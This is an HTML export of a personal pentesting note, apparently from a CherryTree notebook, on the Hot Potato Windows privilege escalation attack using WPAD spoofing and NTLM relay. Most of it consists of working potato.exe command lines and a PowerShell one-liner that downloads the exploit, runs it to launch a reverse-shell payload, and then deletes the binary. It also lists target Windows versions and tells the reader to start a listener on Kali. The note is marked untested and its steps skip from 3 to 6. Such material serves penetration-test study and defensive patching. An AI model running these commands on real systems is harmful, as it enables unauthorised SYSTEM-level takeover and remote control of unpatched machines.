<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Hot Potato: WPAD Spoofing + NTLM relay attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Hot Potato: WPAD Spoofing + NTLM relay attack</h1><br/><span style="color:#ff0000;">WARNING: NOT TESTED</span><br /><br /><strong><h3>Prerequisite:</h3></strong><br />Windows 7, 8, 10, Server 2008, and Server 2012 not patched with<br />•  MS16-075<br />•  <a href="https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016">MS16-077</a><br /><br /><br />GitHub: <a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a><br />Hot Potato is the code name of a Windows privilege escalation technique discovered by Stephen Breen @breenmachine. <br /><br /><a href="https://jlajara.gitlab.io/assets/images/posts/20201122/Diagram_1.png"><img src="images/1339-1.png" alt="images/1339-1.png" /></a><br /><br /><a href=""><img src="images/1339-2.png" alt="images/1339-2.png" /></a><br /><br /><br /><strong>Command exploits for different Windows OSs: </strong><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a><br />• Windows 7:<br />   ◇ <br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>potato.exe <span style="color:#ff9d00;font-weight:700">-</span>ip &lt;localIpWindows&gt; <span style="color:#ff9d00;font-weight:700">-</span>cmd <span style="color:#3ad900;font-weight:400">&quot;C:\PrivEsc\reverse.exe&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>disable_exhaust true<br /></pre></div><br />   ◇ <br />        <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>potato.exe <span style="color:#ff9d00;font-weight:700">-</span>ip &lt;localIpWindows&gt; <span style="color:#ff9d00;font-weight:700">-</span>cmd <span style="color:#3ad900;font-weight:400">&quot;C:\PrivEsc\reverse.exe&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>enable_httpserver true <span style="color:#ff9d00;font-weight:700">-</span>enable_defender true <span style="color:#ff9d00;font-weight:700">-</span>enable_spoof true <span style="color:#ff9d00;font-weight:700">-</span>enable_exhaust true</pre></div><br />    <br /><br /><strong><span style="color:#a5452a;">Example on Windows 7</span></strong> <br />1. Copy the potato.exe exploit executable over to Windows.<br />2. Start a listener on Kali.<br />3. Run the exploit:<br />    <a href="https://github.com/foxglovesec/Potato/raw/master/source/Potato/Potato/bin/Release/Potato.exe">https://github.com/foxglovesec/Potato/raw/master/source/Potato/Potato/bin/Release/Potato.exe</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/foxglovesec/Potato/raw/master/source/Potato/Potato/bin/Release/Potato.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Potato.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Potato.exe -ip 192.168.147.150 -cmd &#39;C:\Users\ckent\Desktop\reverse.exe&#39; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\potato.exe&quot;</span>;</pre></div><br />    <a href=""><img src="images/1339-3.png" alt="images/1339-3.png" /></a><br />6. This will trigger for a Windows Defender update request<br /><br /><br /><br />Bibliography:<br />• <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#hotPotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#hotPotato</a><br />• <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></div>
</body>
</html>
